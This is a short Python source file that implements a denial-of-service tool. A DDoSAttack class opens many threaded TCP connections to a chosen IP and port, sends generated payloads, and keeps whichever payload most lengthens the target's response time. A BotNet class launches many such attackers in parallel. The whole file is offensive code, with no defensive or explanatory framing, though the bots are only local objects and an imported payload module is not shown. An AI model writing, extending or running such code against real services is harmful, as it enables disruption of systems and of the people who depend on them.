import torch
import torch.nn as nn
import socket
import threading
from .random_string_generator import RandomStringGenerator
import logging
import time

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DDoSAttack:
    def __init__(self, target_ip, target_port, num_connections):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.threads = []
        self.model = RandomStringGenerator()

    def create_connection(self):
        for _ in range(self.num_connections):
            thread = threading.Thread(target=self.run_attack)
            self.threads.append(thread)
            thread.start()

    def run_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            # Generate different types of payloads and pick the one that leads to maximum disruption
            max_disruption = -1
            best_payload = None
            for _ in range(10):  # try 10 different types of payloads
                payload = self.model.generate_payload()
                start_time = time.time()
                self.send_payload(sock, payload)
                response_time = time.time() - start_time
                disruption = self.measure_disruption(response_time)
                if disruption > max_disruption:
                    max_disruption = disruption
                    best_payload = payload
            logging.info(f"Best payload: {best_payload}")
        except Exception as e:
            logging.error(f"Exception occurred while running an attack: {e}")

    def send_payload(self, sock, payload):
        sock.send(payload.encode())

    def measure_disruption(self, response_time):
        # The longer the response time, the higher the disruption
        return response_time

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


class BotNet:
    def __init__(self, num_bots, target_ip, target_port, num_connections):
        self.num_bots = num_bots
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.bots = []

    def create_bots(self):
        for _ in range(self.num_bots):
            bot = DDoSAttack(self.target_ip, self.target_port, self.num_connections)
            self.bots.append(bot)

    def launch_attack(self):
        for bot in self.bots:
            bot.create_connection()
        for bot in self.bots:
            bot.wait_for_threads()
